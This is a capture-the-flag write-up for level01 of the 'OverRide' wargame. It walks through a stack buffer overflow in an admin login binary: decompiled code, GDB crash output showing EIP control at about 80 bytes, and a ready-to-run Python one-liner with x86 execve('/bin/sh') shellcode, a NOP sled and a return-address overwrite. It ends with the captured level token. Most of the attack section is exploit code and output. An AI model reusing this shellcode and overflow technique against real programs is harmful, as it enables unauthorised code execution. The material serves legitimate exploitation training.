# level01

1. Static analysis / Decompilation

   * The binary prompts for an admin **username** and then a **password**.
   * The username input is placed into a stack buffer of size `0x100` (256) and read from `stdin`.
   * After username handling, the program asks for a password; the subsequent handling is vulnerable and enables a classic stack **buffer overflow**.

   ### Decompiled / pseudo‑C (overview)

   ```c
   int main(void) {
       char username[0x100];
       puts("********* ADMIN LOGIN PROMPT *********");
       printf("Enter Username: ");
       fgets(username, 0x100, stdin);  // bounded read for username
       puts("verifying username....");
       printf("\nEnter Password: ");
       // password handling follows (vulnerable)
   }
   ```

   ```shell
    (gdb) info address a_user_name
    Symbol "a_user_name" is at 0x804a040 #a_user_name address
   ```


2. Analysis of the vulnerability

   * The level contains a **stack-based buffer overflow** reachable during **password** processing. Carefully crafted input can overwrite saved stack data, including the saved return address (EIP), leading to control‑flow hijack.
   * A cyclic pattern causes a crash with `SIGSEGV` at an address derived from the pattern, confirming EIP control after ~80 bytes of input.

   #### Evidence under GDB (from notes)

   ```bash
   level01@OverRide:~$ gdb ./level01
   (gdb) r
   ********* ADMIN LOGIN PROMPT *********
   Enter Username: dat_wil
   verifying username....

   Enter Password:
   Aa0Aa1Aa2...Ad2A
   nope, incorrect password...

   Program received signal SIGSEGV, Segmentation fault.
   0x37634136 in ?? ()  # offset ~80
   ```

3. Finding the overflow offset

   * Using a cyclic pattern reveals **EIP offset ≈ 80 bytes**. After ~80 bytes of attacker‑controlled data, the next 4 bytes are interpreted as the saved return address.

4. Exploit construction

   **Strategy:**

   1. Supply a username expected by the program (e.g., `dat_wil`).
   2. Deliver shellcode with the username (stored on the stack / in process memory).
   3. On the password prompt, send a payload that overflows the vulnerable buffer, includes a **NOP sled**, and overwrites the saved return address with a pointer into the sled/shellcode region which was placed earlier at a_user_name + 7 (because dat_wil is 7 bytes long).

   **One‑liner payload components:**

   * `dat_wil` — a benign username prefix the binary recognizes.
   * Shellcode — classic x86 `execve("/bin/sh")`.
   * `\n` — terminates the username read; remaining bytes feed the password read.
   * `\x90 * 80` — NOP sled to widen the landing zone.
   * `\x47\xa0\x04\x08` — little‑endian overwrite of the saved return address (`0x0804a047`) chosen to jump into the injected region.

5. Exploitation (command used)

   ```bash
   cat <(python -c "print 'dat_wil' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\n' + ('\x90' * 80) + '\x47\xa0\x04\x08'") - | ./level01
   ```

6. Token

   token found `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`